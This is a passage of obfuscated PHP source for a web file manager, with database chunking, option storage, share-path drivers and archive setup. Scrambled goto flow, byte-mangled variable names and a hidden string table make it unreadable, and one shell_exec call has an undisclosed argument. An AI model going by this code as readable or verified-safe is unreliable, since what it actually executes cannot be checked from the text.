is_array($d‘ßóÇÀ ‘) ? $d‘ßóÇÀ ‘ : array(); $c±”’§˜Û¸ = count($d‘ßóÇÀ ‘); goto b§‚‰¯ÓÉÎ; b§‚‰¯ÓÉÎ: for ($Ağ‘÷Ã›Šù = 0; $Ağ‘÷Ã›Šù < $c±”’§˜Û¸; $Ağ‘÷Ã›Šù += $bäíÏ×Î) { $BâñÁ›×œ = array_slice($d‘ßóÇÀ ‘, $Ağ‘÷Ã›Šù, $bäíÏ×Î); if (!is_array($BâñÁ›×œ) || count($BâñÁ›×œ) == 0) { break; } $Fª ŒÈ™†[$dÊø¤Š–·…[263]][$EØØ¹™éÙİ][1] = $BâñÁ›×œ; $this->optionsValue($Fª ŒÈ™†); $Aä¹˜ŞİÙ¹ += parent::save($bëµ•İîÔÛ, $fàä¢¦í²È); $this->chunkEventCheck(count($BâñÁ›×œ)); } $this->chunkEventSet(); return $Aä¹˜ŞİÙ¹; goto A½ôªÔÕ¹„; cÎŠİ¿öï: $dÊø¤Š–·… =& $_SERVER[Æ]; $bäíÏ×Î = self::SQL_WHERE_IN_CHUNK; $Fª ŒÈ™† = $this->optionsValue(); goto e‡×İæƒ; e‡×İæƒ: $EØØ¹™éÙİ = $this->findWhereField($Fª ŒÈ™†); if (!$EØØ¹™éÙİ) { return parent::save($bëµ•İîÔÛ, $fàä¢¦í²È); } $Aä¹˜ŞİÙ¹ = 0; goto bê— ¢òñˆ; A½ôªÔÕ¹„: } public function add($B“®Ô¦ŠË = '', $dòï¸ÄÂƒ³ = array(), $C£¸«²†ã“ = false) { if ($this->addTaskStatus && is_array($B“®Ô¦ŠË)) { $this->addTaskData[] = $B“®Ô¦ŠË; return; } return parent::add($B“®Ô¦ŠË, $dòï¸ÄÂƒ³, $C£¸«²†ã“); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($dì¹™¯¨ = array()) { goto aà‡Š¶ŠÆÉ; aà‡Š¶ŠÆÉ: $cøÕÊ­ƒ½ =& $_SERVER[Æ]; $d±­§’ä†Ü = self::SQL_WHERE_IN_CHUNK; $d²·ã¾´èÉ = $this->optionsValue(); goto F›‹Æ´³õ„; dåØˆË¡å¾: $e¾ƒ‡ÑÏŸ = is_array($e¾ƒ‡ÑÏŸ) ? $e¾ƒ‡ÑÏŸ : array(); $FãäñÊ¢í = null; for ($aËÑ‘Ê ” = 0; $aËÑ‘Ê ” < count($e¾ƒ‡ÑÏŸ); $aËÑ‘Ê ” += $d±­§’ä†Ü) { $E—åƒ®İ™ = array_slice($e¾ƒ‡ÑÏŸ, $aËÑ‘Ê ”, $d±­§’ä†Ü); if (!is_array($E—åƒ®İ™) || count($E—åƒ®İ™) == 0) { break; } $d²·ã¾´èÉ[$cøÕÊ­ƒ½[263]][$aƒ³¯ÊİÄ«][1] = $E—åƒ®İ™; $this->optionsValue($d²·ã¾´èÉ); $eöˆ›ã®ÑÈ = parent::select($dì¹™¯¨); if (!$eöˆ›ã®ÑÈ) { continue; } if (is_null($FãäñÊ¢í)) { $FãäñÊ¢í = array(); } $FãäñÊ¢í = array_merge($FãäñÊ¢í, $eöˆ›ã®ÑÈ); } goto fŠ¨‰…Àˆ´; F›‹Æ´³õ„: $aƒ³¯ÊİÄ« = $this->findWhereField($d²·ã¾´èÉ); if (!$aƒ³¯ÊİÄ« || isset($d²·ã¾´èÉ[$cøÕÊ­ƒ½[280]]) || isset($d²·ã¾´èÉ[$cøÕÊ­ƒ½[340]])) { return parent::select($dì¹™¯¨); } $e¾ƒ‡ÑÏŸ = $d²·ã¾´èÉ[$cøÕÊ­ƒ½[263]][$aƒ³¯ÊİÄ«][1]; goto dåØˆË¡å¾; fŠ¨‰…Àˆ´: return $FãäñÊ¢í; goto bŞ”±èËÜ´; bŞ”±èËÜ´: } public function delete($C‹àµÅÁì = array()) { goto FØ°±´Õêê; FØ°±´Õêê: $E­‰¡‡ã• =& $_SERVER[Æ]; $cÏÜ“íëìá = self::SQL_WHERE_IN_CHUNK; $b’·™á‹Ø = $this->optionsValue(); goto d÷¢”¨õ×; Cƒ«ÏÕÚñ³: return $a­æ‹çÚ¹Ì; goto EàÓåîŸâ‹; d÷¢”¨õ×: $Bèèà¬Œ­ = $this->findWhereField($b’·™á‹Ø); if (!$Bèèà¬Œ­) { return parent::delete($C‹àµÅÁì); } $a­æ‹çÚ¹Ì = 0; goto A•½ª¸ìæ·; A•½ª¸ìæ·: $CÌê¾ùî­µ = $b’·™á‹Ø[$E­‰¡‡ã•[263]][$Bèèà¬Œ­][1]; $CÌê¾ùî­µ = is_array($CÌê¾ùî­µ) ? $CÌê¾ùî­µ : array(); for ($fÍ”‚µˆ¶ = 0; $fÍ”‚µˆ¶ < count($CÌê¾ùî­µ); $fÍ”‚µˆ¶ += $cÏÜ“íëìá) { $BíÇèÉ±¸ë = array_slice($CÌê¾ùî­µ, $fÍ”‚µˆ¶, $cÏÜ“íëìá); if (!is_array($BíÇèÉ±¸ë) || count($BíÇèÉ±¸ë) == 0) { break; } $b’·™á‹Ø[$E­‰¡‡ã•[263]][$Bèèà¬Œ­][1] = $BíÇèÉ±¸ë; $this->optionsValue($b’·™á‹Ø); $a­æ‹çÚ¹Ì += parent::delete($C‹àµÅÁì); } goto Cƒ«ÏÕÚñ³; EàÓåîŸâ‹: } private function findWhereField($E„Ü—§±ğÒ) { $AŒ‡ßø«£ =& $_SERVER[Æ]; $cˆ†–áŸÆï = self::SQL_WHERE_IN_CHUNK; if (!is_array($E„Ü—§±ğÒ) || !is_array($E„Ü—§±ğÒ[$AŒ‡ßø«£[263]])) { return !1; } foreach ($E„Ü—§±ğÒ[$AŒ‡ßø«£[263]] as $e¡Û‡öêğ => $F‹‘¯Š—ÇÖ) { if (is_array($F‹‘¯Š—ÇÖ) && isset($F‹‘¯Š—ÇÖ[0]) && is_string($F‹‘¯Š—ÇÖ[0]) && strtolower($F‹‘¯Š—ÇÖ[0]) == $AŒ‡ßø«£[7] && is_array($F‹‘¯Š—ÇÖ[1]) && count($F‹‘¯Š—ÇÖ[1]) > $cˆ†–áŸÆï) { ignore_timeout(); return $e¡Û‡öêğ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\145\x6d\117\160\x74\x69\157\x6e"; public $field = array(); public function listData($e¼ë†¹‡Š = false, $cÌùµÍš†© = "\x6d\157\144\x69\x66\x79\x54\x69\155\x65", $fñ×µ¡’âÀ = false) { $eíùÀÖ¯× = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$eíùÀÖ¯×) { return $e¼ë†¹‡Š ? null : array(); } if (!$e¼ë†¹‡Š) { $eíùÀÖ¯× = array_filter(array_values($eíùÀÖ¯×)); return array_sort_by($eíùÀÖ¯×, $cÌùµÍš†©, $fñ×µ¡’âÀ); } return $eíùÀÖ¯×[$_SERVER[Æ][364] . $e¼ë†¹‡Š]; } public function insert($eøŸéÁ‚É) { goto B‚âõ«ğù; B‚âõ«ğù: $C”á‚Ş÷Œ¸ =& $_SERVER[Æ]; $eøŸéÁ‚É = array_field_key($eøŸéÁ‚É, $this->field); $F¯­Ï¨†îæ = Model($this->modelType)->get($C”á‚Ş÷Œ¸[365], $this->optionType . $C”á‚Ş÷Œ¸[366]); goto aµ¤›ªÖÔ; dõÑĞ†ˆ›Û: $eøŸéÁ‚É[$C”á‚Ş÷Œ¸[107]] = time(); Model($this->modelType)->set($C”á‚Ş÷Œ¸[365], $F¯­Ï¨†îæ, $this->optionType . $C”á‚Ş÷Œ¸[366]); Model($this->modelType)->set($C”á‚Ş÷Œ¸[364] . $F¯­Ï¨†îæ, $eøŸéÁ‚É, $this->optionType); goto BšÕ³ÓùäÀ; BšÕ³ÓùäÀ: return $F¯­Ï¨†îæ; goto bÕãˆÉ«ø¥; aµ¤›ªÖÔ: $F¯­Ï¨†îæ = $F¯­Ï¨†îæ ? $F¯­Ï¨†îæ : 0; $eøŸéÁ‚É[$C”á‚Ş÷Œ¸[367]] = ++$F¯­Ï¨†îæ; $eøŸéÁ‚É[$C”á‚Ş÷Œ¸[187]] = time(); goto dõÑĞ†ˆ›Û; bÕãˆÉ«ø¥: } public function update($DÌå…ïÓ“, $dÕËÍ¥à‡ˆ) { goto E…”Ø„ Ÿ¥; E¯ŞóêéÅ²: return Model($this->modelType)->set($dİ¶Ô‚¿õÑ[364] . $DÌå…ïÓ“, $dÕËÍ¥à‡ˆ, $this->optionType); goto Aó¹ší÷; E…”Ø„ Ÿ¥: $dİ¶Ô‚¿õÑ =& $_SERVER[Æ]; $dÕËÍ¥à‡ˆ = array_field_key($dÕËÍ¥à‡ˆ, $this->field); $eÛÙÏ†Áõ = $this->listData($DÌå…ïÓ“); goto F«ö“¨ãª; F«ö“¨ãª: if (!$eÛÙÏ†Áõ) { return !1; } $dÕËÍ¥à‡ˆ = array_merge($eÛÙÏ†Áõ, $dÕËÍ¥à‡ˆ); $dÕËÍ¥à‡ˆ[$dİ¶Ô‚¿õÑ[107]] = time(); goto E¯ŞóêéÅ²; Aó¹ší÷: } public function remove($b¯ŠŠÓ°ô) { return Model($this->modelType)->remove($_SERVER[Æ][364] . $b¯ŠŠÓ°ô, $this->optionType); } public function clear() { $cçàáª„¸ =& $_SERVER[Æ]; Model($this->modelType)->remove($cçàáª„¸[365], $this->optionType . $cçàáª„¸[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($d™–ä„âà, $eÒÉ—¦¥ÎŒ) { if (!$eÒÉ—¦¥ÎŒ) { return !1; } $f¹œõ›£¿· = $this->listData(); $f¹œõ›£¿· = array_to_keyvalue($f¹œõ›£¿·, $d™–ä„âà); return isset($f¹œõ›£¿·[$eÒÉ—¦¥ÎŒ]) ? $f¹œõ›£¿·[$eÒÉ—¦¥ÎŒ] : !1; } public function findByName($d™¯•øò“») { return $this->findByKey($_SERVER[Æ][28], $d™¯•øò“»); } protected function resetData($C‹ÕŞ¦”„Ù) { $C‚—×Íàª© =& $_SERVER[Æ]; $C‹ÕŞ¦”„Ù = is_array($C‹ÕŞ¦”„Ù) ? $C‹ÕŞ¦”„Ù : array(); $f”Õ Ôƒ— = array(); for ($B¾’¿Ê‹“Ö = 0; $B¾’¿Ê‹“Ö < count($C‹ÕŞ¦”„Ù); $B¾’¿Ê‹“Ö++) { $f”Õ Ôƒ—[$C‚—×Íàª©[364] . $C‹ÕŞ¦”„Ù[$B¾’¿Ê‹“Ö][$C‚—×Íàª©[367]]] = $C‹ÕŞ¦”„Ù[$B¾’¿Ê‹“Ö]; } return Model($this->modelType)->set($f”Õ Ôƒ—, !1, $this->optionType); } private function getAutoName($FÔº†ùêŸŒ) { $dÓÅŠÆÖôš = array_to_keyvalue($this->listData(), $_SERVER[Æ][28]); if (!$dÓÅŠÆÖôš || !isset($dÓÅŠÆÖôš[$FÔº†ùêŸŒ])) { return $FÔº†ùêŸŒ; } for ($bèöç†ëÜ± = 1; $bèöç†ëÜ± < count($dÓÅŠÆÖôš); $bèöç†ëÜ±++) { $B º£‘ô™¶ = $FÔº†ùêŸŒ . "\x28{$bèöç†ëÜ±}\51"; if (!isset($dÓÅŠÆÖôš[$B º£‘ô™¶])) { return $B º£‘ô™¶; } } return $B º£‘ô™¶; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($a¦½© ºğÍ = false, $Dƒ’åÒÜî = '', $C‰¸ºåô–ã = false) { goto f§¬‰’¨†Ù; f§¬‰’¨†Ù: $B…ƒƒçåÙ =& $_SERVER[Æ]; $bÜêîº¦Ûƒ = $this->cacheGet($Dƒ’åÒÜî); $FŸãëŸŠ¢ = $this->optionDefault($Dƒ’åÒÜî); goto AÊ›ö×ïËö; AÊ›ö×ïËö: $FŸãëŸŠ¢ = is_array($FŸãëŸŠ¢) ? $FŸãëŸŠ¢ : array(); if (is_array($bÜêîº¦Ûƒ)) { $bÜêîº¦Ûƒ = array_merge($FŸãëŸŠ¢, $bÜêîº¦Ûƒ); return $a¦½© ºğÍ ? isset($bÜêîº¦Ûƒ[$a¦½© ºğÍ]) ? $bÜêîº¦Ûƒ[$a¦½© ºğÍ] : null : $bÜêîº¦Ûƒ; } $bŠæÆÒ­Š = $this->filterWhere(array($B…ƒƒçåÙ[29] => $Dƒ’åÒÜî)); goto DÆÔ°êÓ©«; Eó¹ĞáÀ­·: $this->cacheSet($Dƒ’åÒÜî, $bÜêîº¦Ûƒ); $bÜêîº¦Ûƒ = array_merge($FŸãëŸŠ¢, $bÜêîº¦Ûƒ); return $a¦½© ºğÍ ? $bÜêîº¦Ûƒ[$a¦½© ºğÍ] : $bÜêîº¦Ûƒ; goto D°÷Œ…‰ö™; DÆÔ°êÓ©«: $bÜêîº¦Ûƒ = $this->where($bŠæÆÒ­Š)->select(); $bÜêîº¦Ûƒ = array_to_keyvalue($bÜêîº¦Ûƒ, $B…ƒƒçåÙ[89], $B…ƒƒçåÙ[359]); foreach ($bÜêîº¦Ûƒ as $aÅ½Ø¾Ô“Å => $e·ìøŸ–‚) { if ($C‰¸ºåô–ã || in_array($aÅ½Ø¾Ô“Å, $this->jsonField)) { $bÜêîº¦Ûƒ[$aÅ½Ø¾Ô“Å] = json_decode($e·ìøŸ–‚, !0); } } goto Eó¹ĞáÀ­·; D°÷Œ…‰ö™: } public function set($aöÆÏé„Õ°, $FŒĞ Îßî  = false, $bÑí£·çÀ = '') { goto C÷ŠƒÂâ‘­; C÷ŠƒÂâ‘­: $E×ÒÕ¯½• =& $_SERVER[Æ]; $this->cacheRemove($bÑí£·çÀ); $BÙÄÒæë‰ = array(); goto FäÚÀ½¸é; f‚äŸêÂãõ: return $this->addAll($BÙÄÒæë‰, array(), !0); goto b£„·Áƒäê; FäÚÀ½¸é: $C°Ø‚ˆÛ‰ã = is_array($aöÆÏé„Õ°) ? $aöÆÏé„Õ° : array($aöÆÏé„Õ° => $FŒĞ Îßî ); foreach ($C°Ø‚ˆÛ‰ã as $d›”…ƒ«Ÿ™ => $FÁÂ«âà¤) { if (is_array($FÁÂ«âà¤)) { $FÁÂ«âà¤ = json_encode_force($FÁÂ«âà¤); } $this->checkLength($FÁÂ«âà¤, !1, $this->tableName . $E×ÒÕ¯½•[4] . $aöÆÏé„Õ°); $FÁÂ«âà¤ = self::textEncode($FÁÂ«âà¤); $C°Ø‚ˆÛ‰ã = array($E×ÒÕ¯½•[29] => $bÑí£·çÀ, $E×ÒÕ¯½•[89] => $d›”…ƒ«Ÿ™, $E×ÒÕ¯½•[359] => $FÁÂ«âà¤); $BÙÄÒæë‰[] = $this->filterWhere($C°Ø‚ˆÛ‰ã); } if (!$BÙÄÒæë‰) { return !0; } goto f‚äŸêÂãõ; b£„·Áƒäê: } protected function optionDefault($c°à·èçæƒ = '') { return !1; } public function setDeep($eÉËä›åÂ», $Fì˜ÑËÈ§ = false, $aáÇºİõï = '') { $bĞ›î”äÀš = explode($_SERVER[Æ][91], $eÉËä›åÂ»); $bñ‘åˆ¿Ÿ = $this->get(); array_set_value($bñ‘åˆ¿Ÿ, $eÉËä›åÂ», $Fì˜ÑËÈ§); $this->set($bĞ›î”äÀš[0], $bñ‘åˆ¿Ÿ[$bĞ›î”äÀš[0]], $aáÇºİõï); } public function remove($FÚèÀ£ƒŠò, $dÛ“ÛğëÇ÷ = '') { $dìËé¤‡µš =& $_SERVER[Æ]; $this->cacheRemove($dÛ“ÛğëÇ÷); $cÍ¥æˆø¢ì = $this->filterWhere(array($dìËé¤‡µš[89] => $FÚèÀ£ƒŠò, $dìËé¤‡µš[29] => $dÛ“ÛğëÇ÷)); if (is_null($FÚèÀ£ƒŠò)) { unset($cÍ¥æˆø¢ì[$dìËé¤‡µš[89]]); } return $this->where($cÍ¥æˆø¢ì)->delete(); } public function cacheSet($a…ÅÆÜœÌ, $EÆóáßø = false) { return Cache::set($this->cacheKey($a…ÅÆÜœÌ), $EÆóáßø); } public function cacheGet($a‘œ¥Íƒ˜Ó) { return Cache::get($this->cacheKey($a‘œ¥Íƒ˜Ó)); } public function cacheRemove($a®”™º„ã) { return Cache::remove($this->cacheKey($a®”™º„ã)); } protected function filterWhere($a²ñ‰òí°¦) { return $a²ñ‰òí°¦; } protected function cacheKey($Dœë »µñ) { return $Dœë »µñ; } } goto C†ñ–ÛŞ‹; DÓ£×İôÓ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Aªº”»é¡») { $this->pathParse = $Aªº”»é¡»; $this->model = Model($_SERVER[Æ][1117]); } public function getPathOuter($Fƒ¾Ì¶¹Ö…) { $BøÃ††¢Õ¿ =& $_SERVER[Æ]; if (!$Fƒ¾Ì¶¹Ö…) { return $Fƒ¾Ì¶¹Ö…; } $eÖ÷´µ‚Ä‹ = $this->parse($Fƒ¾Ì¶¹Ö…); return trim(KodIO::makeShare($this->pathParse[$BøÃ††¢Õ¿[367]], $eÖ÷´µ‚Ä‹[$BøÃ††¢Õ¿[367]]), $BøÃ††¢Õ¿[8]); } protected function infoParse($D¦˜´ÜÒÄ, $b›ŒÃÙ»‘ = false, $e–È¿œêÛ÷ = false) { $e¯°•’‹å¬ =& $_SERVER[Æ]; $FÖ®©×£Ñ = $this->pathParse[$e¯°•’‹å¬[367]]; $Fª†¦è¿Š = trim($this->pathParse[$e¯°•’‹å¬[1011]], $e¯°•’‹å¬[8]); return Action($e¯°•’‹å¬[1123])->sharePathInfo($FÖ®©×£Ñ, $Fª†¦è¿Š); } public function infoFull($dÚÓ‡²Šõ•) { $eöÃŒÏ˜… =& $_SERVER[Æ]; $CÅ’Æ¨ö· = explode($eöÃŒÏ˜…[8], trim($dÚÓ‡²Šõ•, $eöÃŒÏ˜…[8])); if (count($CÅ’Æ¨ö·) > 1) { $F‘¼¾¯ÅÕ¨ = implode($eöÃŒÏ˜…[8], array_splice($CÅ’Æ¨ö·, 1)); $D¼ÉŞªÃã = $this->model->pathInfoByPath($CÅ’Æ¨ö·[0], $F‘¼¾¯ÅÕ¨); if (!$D¼ÉŞªÃã) { return !1; } $this->pathParse[$eöÃŒÏ˜…[1011]] = $D¼ÉŞªÃã[$eöÃŒÏ˜…[369]]; } return $this->infoParse($dÚÓ‡²Šõ•); } public function listAll($C÷ó ”—†ê) { goto cá×©–ôÉØ; cá×©–ôÉØ: $bé¯Ûí¯ÄÜ =& $_SERVER[Æ]; $EÎã­Ñ·í = IO::info($this->pathParse[$bé¯Ûí¯ÄÜ[75]]); if (!$EÎã­Ñ·í) { return array(); } goto c­ØİÛ£Ä; Bä î½çƒ: foreach ($Dšœ«…¿ŞË as &$F–ƒ˜ïÊ¿‚) { check_abort(); $F–ƒ˜ïÊ¿‚[$bé¯Ûí¯ÄÜ[391]] = $DÅ×„—‘²Õ->_shareItemeParse($F–ƒ˜ïÊ¿‚[$bé¯Ûí¯ÄÜ[391]], $Bí³ÃõíŒô); } return $Dšœ«…¿ŞË; goto CÜœÕ¿æ§Æ; c­ØİÛ£Ä: $Dšœ«…¿ŞË = $this->model->listAll($C÷ó ”—†ê); $Bí³ÃõíŒô = Model($bé¯Ûí¯ÄÜ[536])->getInfo($EÎã­Ñ·í[$bé¯Ûí¯ÄÜ[441]]); $DÅ×„—‘²Õ = Action($bé¯Ûí¯ÄÜ[1123]); goto Bä î½çƒ; CÜœÕ¿æ§Æ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Eù­‰Ë) { $this->pathParse = $Eù­‰Ë; $this->model = Model($_SERVER[Æ][1117]); } protected function infoParse($c¸Ğ„èçÒ, $FâÀŠ½ë¡ó = false, $aá¨¢à˜¦Ì = false) { $Eô‡‹—§Ğ§ =& $_SERVER[Æ]; return Action($Eô‡‹—§Ğ§[1017])->sharePathInfo($this->pathParse[$Eô‡‹—§Ğ§[75]], !0); } public function listPath($bè÷ò²ïÚÏ, $eå‘Ìƒ±Î¿ = false) { $c°ôã¬å£Ò =& $_SERVER[Æ]; $bñœ´­”ß = parent::listPath($bè÷ò²ïÚÏ, $eå‘Ìƒ±Î¿); foreach ($bñœ´­”ß as $aî—‚ÒéÍ‹ => $E—â›¹Ä™) { if (!in_array($aî—‚ÒéÍ‹, array($c°ôã¬å£Ò[73], $c°ôã¬å£Ò[74]))) { continue; } foreach ($E—â›¹Ä™ as $C¢§õÏôğ‹ => $C­¤¤ğ ªš) { $bñœ´­”ß[$aî—‚ÒéÍ‹][$C¢§õÏôğ‹] = Action($c°ôã¬å£Ò[1017])->shareItemInfo($C­¤¤ğ ªš); } } return $bñœ´­”ß; } public function listAll($C•…ì½Î¤¨) { $D‰…¼Ë¢¶¢ =& $_SERVER[Æ]; $Bï§Ÿãàğ« = IO::info($this->pathParse[$D‰…¼Ë¢¶¢[75]]); if (!$Bï§Ÿãàğ«) { return array(); } $Dİ¤Å§ ã´ = $this->model->listAll($C•…ì½Î¤¨); foreach ($Dİ¤Å§ ã´ as &$bÌ¡ÓÛµ¶Å) { $bÌ¡ÓÛµ¶Å[$D‰…¼Ë¢¶¢[391]] = Action($D‰…¼Ë¢¶¢[1017])->shareItemInfo($bÌ¡ÓÛµ¶Å[$D‰…¼Ë¢¶¢[391]]); } return $Dİ¤Å§ ã´; } } class PathDriverDriverShareItem { public function __construct($aô™²Šî‰) { $this->pathParse = $aô™²Šî‰; } public function __call($aÉôƒšÛ„, $BÇó‹Ğ·äª) { $B­İµŠõ =& $_SERVER[Æ]; if (method_exists($this, $aÉôƒšÛ„)) { return; } $d–’ôé†ùÏ = call_user_func_array(array($B­İµŠõ[1124], $aÉôƒšÛ„), $BÇó‹Ğ·äª); $AªÜ±‡õî = array($B­İµŠõ[1125], $B­İµŠõ[1126], $B­İµŠõ[1127], $B­İµŠõ[1128], $B­İµŠõ[490], $B­İµŠõ[492], $B­İµŠõ[1129], $B­İµŠõ[103], $B­İµŠõ[1130], $B­İµŠõ[1131]); if (in_array($aÉôƒšÛ„, $AªÜ±‡õî)) { $d–’ôé†ùÏ = $this->getPathOuter($d–’ôé†ùÏ); } return $d–’ôé†ùÏ; } public function copy($C‚œê­­Ã‘, $C˜³‹İ¶Ğš, $AÂˆƒ²ƒóâ = false) { return $this->copyMove($C‚œê­­Ã‘, $C˜³‹İ¶Ğš, $AÂˆƒ²ƒóâ, $_SERVER[Æ][490]); } public function move($e¨·¡Òª‹×, $cŒâŞ¿†ö›, $DÇÛÅË’ĞÅ = false) { return $this->copyMove($e¨·¡Òª‹×, $cŒâŞ¿†ö›, $DÇÛÅË’ĞÅ, $_SERVER[Æ][492]); } private function copyMove($C«İ‡õˆØ, $E½ƒ°Úµ©, $EÄìÊ’¤¿ì, $Aœ³ßÉŠÊå) { goto dšİ¤ê˜õé; e­Êª¨¹: if ($dŸæ³Ø©æÌ->pathParse[$cÌ©éÄ–Å[998]]) { $E½ƒ°Úµ© = $dŸæ³Ø©æÌ->pathParse[$cÌ©éÄ–Å[998]]; } else { $E½ƒ°Úµ© = $DÙ¹åãâæÎ; } $c¾Áóô™— = IO::copyMove($C«İ‡õˆØ, $E½ƒ°Úµ©, $EÄìÊ’¤¿ì, $Aœ³ßÉŠÊå); $c¾Áóô™— = $this->getPathOuter($c¾Áóô™—); goto föÓÌ˜ŠÀ¦; dšİ¤ê˜õé: $cÌ©éÄ–Å =& $_SERVER[Æ]; $DÙ¹åãâæÎ = $E½ƒ°Úµ©; $dŸæ³Ø©æÌ = IO::driverMake($E½ƒ°Úµ©); goto e­Êª¨¹; föÓÌ˜ŠÀ¦: return $c¾Áóô™—; goto DÊÄÚò¤†; DÊÄÚò¤†: } public function pathFather($dŠñÎ¡§‰) { return get_path_father($this->pathParse[$_SERVER[Æ][75]]); } public function iconvSystem($F­˜ù»…†) { return $F­˜ù»…†; } protected function infoParse($f¬‰’ëâ™…, $eŠò´´ëÆ‚ = false) { $F„ö£õÜ =& $_SERVER[Æ]; $AÅ¾ŒÑóƒ¬ = $this->pathParse[$F„ö£õÜ[439]][$F„ö£õÜ[1018]] . $this->pathParse[$F„ö£õÜ[1011]]; if ($eŠò´´ëÆ‚) { $e§½×‘ùèİ = IO::infoWithChildren($AÅ¾ŒÑóƒ¬); } else { $e§½×‘ùèİ = IO::info($AÅ¾ŒÑóƒ¬); } $c¡ößò·ç‹ = $this->pathParse[$F„ö£õÜ[439]]; return Action($F„ö£õÜ[1123])->_shareItemeParse($e§½×‘ùèİ, $c¡ößò·ç‹); } public function listAll($Eƒ–æŒÎÆ¶) { $dˆÃµà°¨× =& $_SERVER[Æ]; $a’ä±–Í = IO::listAll($Eƒ–æŒÎÆ¶); $Dë¬Ğ’­‚Ø = $this->pathParse[$dˆÃµà°¨×[439]]; foreach ($a’ä±–Í as &$fƒ•ùâçÛÈ) { check_abort(); $fƒ•ùâçÛÈ = array_merge(IO::info($fƒ•ùâçÛÈ[$dˆÃµà°¨×[75]]), $fƒ•ùâçÛÈ); $fƒ•ùâçÛÈ[$dˆÃµà°¨×[391]] = Action($dˆÃµà°¨×[1123])->_shareItemeParse($fƒ•ùâçÛÈ, $Dë¬Ğ’­‚Ø); } return $a’ä±–Í; } public function getPathOuter($DìÇñ‡´ĞÎ) { goto Eï†ƒ×¯µ¿; E…ˆÈ†¥³Ö: if (substr($D²á´…ß‚, 0, strlen($CğÀ•íÏ)) != $CğÀ•íÏ) { return !1; } return $this->pathParse[$dÎÔ‡®×š[1012]] . $dÎÔ‡®×š[8] . ltrim($C½°¨¥†„, $dÎÔ‡®×š[8]); goto bÑĞ’š†¸; Eï†ƒ×¯µ¿: $dÎÔ‡®×š =& $_SERVER[Æ]; $A›É­Ä§Ï = KodIO::parse($DìÇñ‡´ĞÎ); if ($A›É­Ä§Ï[$dÎÔ‡®×š[29]] == KodIO::KOD_SHARE_ITEM) { return $A›É­Ä§Ï[$dÎÔ‡®×š[75]]; } goto dÌİ­´á›È; dÌİ­´á›È: $D²á´…ß‚ = KodIO::clear($DìÇñ‡´ĞÎ); $CğÀ•íÏ = KodIO::clear($this->pathParse[$dÎÔ‡®×š[439]][$dÎÔ‡®×š[1018]]); $C½°¨¥†„ = substr($D²á´…ß‚, strlen($CğÀ•íÏ)); goto E…ˆÈ†¥³Ö; bÑĞ’š†¸: } public function getType() { $cÍçä¼ïæ° =& $_SERVER[Æ]; $bà Èçèó = str_replace($cÍçä¼ïæ°[71], $cÍçä¼ïæ°[33], get_class($this)); return strtolower($bà Èçèó); } public function isTypeObject($a¾çŠöÙêê) { return IO::isTypeObject($a¾çŠöÙêê); } public function info($aåøŒ„™‰) { return $this->infoParse($aåøŒ„™‰); } public function infoAuth($CĞ‘ƒ´¡›¡) { return $this->infoParse($CĞ‘ƒ´¡›¡); } public function infoWithChildren($eÜÌÊÒŸ±») { return $this->infoParse($eÜÌÊÒŸ±», !0); } public function infoFull($A¸ †È–Ñº) { return $this->infoParse($A¸ †È–Ñº); } } goto b´¾¿òÍÁ©; bÑ„ÑÊğ‹Ó: class KodArchive { static function init() { goto EÌ‘øß¬‘; A ­áˆåÁù: define($A”¢ ŸÒªĞ[1885], TEMP_FILES); define($A”¢ ŸÒªĞ[1886], TEMP_FILES); define($A”¢ ŸÒªĞ[1887], $A”¢ ŸÒªĞ[1888]); goto f”Œƒ‘¯†¹; EÌ‘øß¬‘: $A”¢ ŸÒªĞ =& $_SERVER[Æ]; if (defined($A”¢ ŸÒªĞ[1883])) { return; } define($A”¢ ŸÒªĞ[1883], SDK_DIR . $A”¢ ŸÒªĞ[1884]); goto A ­áˆåÁù; f²ˆæ’§»§: require_once ARCHIVE_LIB . $A”¢ ŸÒªĞ[1891]; require_once ARCHIVE_LIB . $A”¢ ŸÒªĞ[1892]; require_once ARCHIVE_LIB . $A”¢ ŸÒªĞ[1893]; goto a“Ÿ˜¡œï‚; a“Ÿ˜¡œï‚: require_once ARCHIVE_LIB . $A”¢ ŸÒªĞ[1894]; goto B×ùàš„ÃÀ; f”Œƒ‘¯†¹: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $A”¢ ŸÒªĞ[1889]; require_once ARCHIVE_LIB . $A”¢ ŸÒªĞ[1890]; goto f²ˆæ’§»§; B×ùàš„ÃÀ: } static function checkIfType($F©Âô×“³í, $FõÃ›‘•Ï) { goto CâÖÌ‚×öÔ; f¤ÅŠÅî·È: $b´¯¿†— = in_array($F©Âô×“³í, $E‚Ó±•ÎÈß[$FõÃ›‘•Ï]); if ($b´¯¿†— && ($FõÃ›‘•Ï == $e‘•öÆãƒ–[301] || $FõÃ›‘•Ï == $e‘•öÆãƒ–[1898]) && (!function_exists($e‘•öÆãƒ–[1906]) || !function_exists($e‘•öÆãƒ–[1907]))) { show_tips($e‘•öÆãƒ–[1908]); } if ($b´¯¿†— && $FõÃ›‘•Ï == $e‘•öÆãƒ–[1045] && (!function_exists($e‘•öÆãƒ–[1909]) || !strstr(shell_exec($e‘•öÆãƒ–[1910]), $e‘•öÆãƒ–[1911]))) { show_tips($e‘•öÆãƒ–[1912]); } goto FÇÈ‰ñàÔ«; CâÖÌ‚×öÔ: $e‘•öÆãƒ– =& $_SERVER[Æ]; self::init(); $E‚Ó±•ÎÈß = array($e‘•öÆãƒ–[301] => array($e‘•öÆãƒ–[301], $e‘•öÆãƒ–[1895], $e‘•öÆãƒ–[1896], $e‘•öÆãƒ–[1897]), $e‘•öÆãƒ–[1898] => array($e‘•öÆãƒ–[1898], $e‘•öÆãƒ–[1899], $e‘•öÆãƒ–[1043], $e‘•öÆãƒ–[1041]), $e‘•öÆãƒ–[1045] => array($e‘•öÆãƒ–[1045], $e‘•öÆãƒ–[1900], 